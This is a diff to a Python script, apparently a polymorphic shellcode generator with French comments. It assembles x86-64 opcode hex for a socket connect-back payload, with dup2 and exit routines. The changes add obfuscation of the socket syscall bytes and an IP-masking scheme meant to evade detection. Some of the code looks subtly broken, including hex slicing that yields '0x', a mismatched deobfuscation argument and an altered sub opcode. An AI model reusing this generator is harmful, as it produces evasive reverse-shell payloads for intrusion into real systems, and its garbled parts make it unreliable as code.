@@ -194,67 +194,76 @@ def create_socket():
 
 
 def socket_connect(ip, port):
+   
    global PAYLOAD
    add_string = ""
    l = ["4889c74989fa", "4889c74989C2", "50415a4c89d7", "4989c24889c7"] # mov rdi, rax; mov r10, rax | push rax; pop rdi; mov r10, rdi | push rax; pop r10; mov rdi, r10 | mov r10, rax ; mov rdi, rax
    add_string += l[r(0,len(l)-1)]   
    add_string += clean("rax")
-   add_string += "b02a" if r(0,1) else "042a"
+
+   #Offuscation du socket
+   if r(0,1):
+        #Offuscation
+        random1 = factorOffus("042a")
+        of_string = offus("042a", random1)
+        #Inverse en mirroir tout la chaine pour op code
+        of_string = of_string[::-1]
+        PAYLOAD += "48bb"
+        PAYLOAD+=of_string
+
+        #Désoffuscation
+        deof_string = deOffus(random1, add_string)
+        #Inverse en mirroir tout la chaine pour op code
+        deof_string = deof_string[::-1]
+
+   else :
+        #Offuscation
+        random1 = factorOffus("b02a")
+        of_string = offus("b02a", random1)
+        #Inverse en mirroir tout la chaine pour op code
+        of_string = of_string[::-1]
+        PAYLOAD += "48bb"
+        PAYLOAD+=of_string
+
+        #Désoffuscation
+        deof_string = deOffus(random1, add_string)
+        #Inverse en mirroir tout la chaine pour op code
+        deof_string = deof_string[::-1]
+   
+   add_string += deof_string 
    add_string += clean("rbx")
    add_string += "53" # push rbx
    ip_greater = []
    ip_to_substract = []
    cmp = 0
    for ip in ip.split("."):
-    ip_to_substract.append(r(int(ip)+1, 255))
-    ip_greater.append(ip_to_substract[cmp] - int(ip))
-    cmp += 1
+        ip_to_substract.append(r(int(ip)+1, 255))
+        ip_greater.append(ip_to_substract[cmp] - int(ip))
+        cmp += 1
     
     
-    add_string += "be" # mov esi
-    for i in range(0,len(ip_greater)):
-        if ip_greater[i] < 17: PAYLOAD += "0"
-        PAYLOAD += hex(ip_greater[i])[:2]
-        # print(hex(ip_greater[i])[2:])
+   add_string += "be" # mov esi
+   for i in range(0,len(ip_greater)):
+       if ip_greater[i] < 17: PAYLOAD += "0"
+       PAYLOAD += hex(ip_greater[i])[:2]
 
 
-    add_string += "81ee" # sub esi
-    for i in range(0, len(ip_to_substract)):
+   add_string += "83ee" # sub esi
+   for i in range(0, len(ip_to_substract)):
         if ip_to_substract[i] < 17: PAYLOAD += "0"
         PAYLOAD += hex(ip_to_substract[i])[:2]
-       # print(hex(ip_to_substract[i])[2:])
 
-    #print(PAYLOAD)
-    #port = hex(socket.htons(int(port)))[:2]
-    port = hex(socket.htons(int(port)))
-    print("0 :",port)
+   port = hex(socket.htons(int(port)))
 
-    add_string += "566668" # push
-    print("1 :",add_string, port)
-    add_string += str(port[-4:])  
-    print("2 :",add_string, port)
-    add_string += "666a02" #AF_INET
-    add_string += "4889e6" if r(0,1) else "4831f64801e6" # "mov rsi, rsp" "xor rsi, rsi ; add rsi, rsp"
-    add_string += "b218" # mov dl,24
-    add_string += call()
+   add_string += "566668" # push
+   add_string += str(port[-4:])  
+   add_string += "666a02" #AF_INET
+   add_string += "4889e6" if r(0,1) else "4831f64801e6" # "mov rsi, rsp" "xor rsi, rsi ; add rsi, rsp"
+   add_string += "b218" # mov dl,24
+   add_string += call()
 
-    print("3 :",add_string)
-
-    #Offuscation
-    random1 = factorOffus(add_string)
-    of_string = offus(add_string, random1)
-    #Inverse en mirroir tout la chaine pour op code
-    of_string = of_string[::-1]
-
-    PAYLOAD+=of_string
-
-    #Désoffuscation
-    deof_string = deOffus(random1, add_string)
-    #Inverse en mirroir tout la chaine pour op code
-    deof_string = deof_string[::-1]
-
-    PAYLOAD += deof_string
-    return PAYLOAD
+   PAYLOAD += add_string
+   return PAYLOAD
 
 def dup2x3():
     global PAYLOAD
@@ -324,7 +333,6 @@ def _exit():
     PAYLOAD+=clean("rdx")
     PAYLOAD+="b03c"
     PAYLOAD +='4c89d7'
-   # print(PAYLOAD)
     PAYLOAD += call()
 
 
